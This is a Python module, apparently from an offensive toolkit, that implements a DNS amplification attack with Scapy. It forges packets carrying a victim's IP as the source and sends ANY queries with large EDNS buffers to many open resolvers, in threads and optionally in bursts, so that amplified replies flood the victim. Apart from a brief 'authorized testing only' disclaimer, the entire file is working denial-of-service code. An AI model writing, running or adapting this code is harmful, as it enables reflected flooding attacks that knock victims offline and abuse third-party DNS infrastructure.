# SPDX-License-Identifier: MIT
# Copyright (c) 2026 r3vskd
# Version: 2.0.0
# Status: stable
# Maintained: yes
"""DNS amplification spoof engine -- Layer-3 IP spoofing via Scapy.

WARNING: For authorized penetration testing only. Using this tool against
systems without explicit written permission is illegal.
Requires root/administrator privileges. Linux only for IP spoofing.
"""

import os
import random as _random
import sys
import threading as _threading
import time as _time_module

from scapy.all import send as scapy_send
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP

DEFAULT_VICTIM_PORT = 53  # RFC 1035 standard DNS port

QTYPE_MAP = {
    'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
    'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
    'MX': 15, 'SRV': 33, 'NAPTR': 35, 'CAA': 257,
}


def _make_txid(txid, id_random):
    return _random.randint(0, 0xFFFF) if id_random else txid


def _time_sleep(s):  # thin wrapper to allow patching in tests
    _time_module.sleep(s)


def _is_root():
    if sys.platform == 'win32':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    return os.getuid() == 0


def check_root():
    if not _is_root():
        raise PermissionError(
            "Spoofed mode requires root/administrator privileges "
            "(raw sockets need elevated permissions)."
        )


def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,  # noqa: PLR0913 -- intentional wide interface for CLI passthrough
                           victim_src_port=DEFAULT_VICTIM_PORT, qtype='ANY', edns_payload=4096,
                           dnssec_do=False, txid=0x1337, id_random=False,
                           verbose=False, measure=False, qclass=1):
    """Send one spoofed DNS query; resolver replies flow to victim_ip."""
    txid_val = _make_txid(txid, id_random)
    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)  # default to A on unknown type
    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
    if edns_payload > 0:
        edns_do_flag = 0x8000 if dnssec_do else 0
        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=edns_do_flag)
        pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
    else:
        pkt_dns = DNS(id=txid_val, rd=1, qd=question)
    pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
    if verbose:
        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
        if measure:
            print(f"Query size: {len(pkt)} bytes")
    scapy_send(pkt, verbose=False)


def send_spoofed_queries_through_resolvers(domain, resolvers, resolver_port,
                                           victim_ip, victim_src_port=53,
                                           num_queries=1, interval=1.0,
                                           qtype='ANY', edns_payload=4096,
                                           dnssec_do=False, txid=0x1337,
                                           id_random=False, verbose=False,
                                           measure=False, burst=False,
                                           qclass=1):
    if not resolvers:  # nothing to do
        return
    threads = []
    total = len(resolvers) * num_queries
    fired = 0
    for resolver in (r.strip() for r in resolvers if r.strip()):
        for _ in range(num_queries):
            t = _threading.Thread(
                target=send_spoofed_dns_query,
                args=(domain, resolver, resolver_port, victim_ip,
                      victim_src_port, qtype, edns_payload, dnssec_do,
                      txid, id_random, verbose, measure, qclass))
            threads.append(t)
            t.start()
            fired += 1
            if verbose:
                print(f"[{fired}/{total}] Spoofing via {resolver}")
            if not burst:
                _time_sleep(interval)
    for t in threads:
        t.join()
    threads.clear()